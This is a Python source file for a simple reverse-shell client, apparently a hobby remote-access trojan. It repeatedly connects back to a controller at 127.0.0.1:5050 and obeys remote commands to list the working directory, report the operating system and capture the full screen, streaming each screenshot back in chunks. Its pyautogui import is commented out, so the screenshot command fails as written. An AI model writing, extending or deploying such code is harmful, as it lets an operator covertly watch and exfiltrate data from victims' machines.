import socket
import time
import os
import platform
#import pyautogui
from io import BytesIO

class ClientShell:
    def __init__(self):
        self.CLIENT_IP = "127.0.0.1"
        self.CLIENT_PORT = 5050
        self.TIMEOUT_RETRY = 3
        self.get_os = platform.uname()

    def initializeClientShell(self):
        try:
            clientShell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            clientShell.connect((self.CLIENT_IP, self.CLIENT_PORT))
            print("[*] Connected")
            while True: 
                client_cmd = clientShell.recv(4096).decode('utf-8')
                print("Command : ", client_cmd)

                if client_cmd == "ls":
                    currentDir = os.getcwd()
                    listdir = os.listdir()
                    response = "\n".join([currentDir] + listdir)
                    clientShell.send(response.encode("utf-8"))
                elif client_cmd == 'get_info -sys':
                    get_info_system = f"[+] System : {self.get_os.system}"
                    clientShell.send(get_info_system.encode("utf-8"))
                elif client_cmd == 'screenshot':
                    self.handleScreenshotCommand(clientShell)  # Pass the client socket
        except:
            print("[*] Retrying...")
            time.sleep(self.TIMEOUT_RETRY)
            self.initializeClientShell()

    def send_screenshot_data(self, sock, screenshot_data):
        screenshot_data_size = len(screenshot_data)
        sock.send(screenshot_data_size.to_bytes(4, 'big'))

        # Send the data in chunks of 4096 bytes
        chunk_size = 4096
        offset = 0

        while offset < screenshot_data_size:
            chunk = screenshot_data[offset:offset + chunk_size]
            sock.send(chunk)
            offset += len(chunk)

    def handleScreenshotCommand(self, client_socket):
        img = pyautogui.screenshot()  # Capture the entire screen

        # Convert the screenshot to bytes in memory using BytesIO
        screenshot_bytes = BytesIO()
        img.save(screenshot_bytes, format="PNG")
        screenshot_data = screenshot_bytes.getvalue()

        # Send the screenshot data to the server in chunks
        self.send_screenshot_data(client_socket, screenshot_data)

if __name__ == "__main__":
    clientShell = ClientShell()
    clientShell.initializeClientShell()
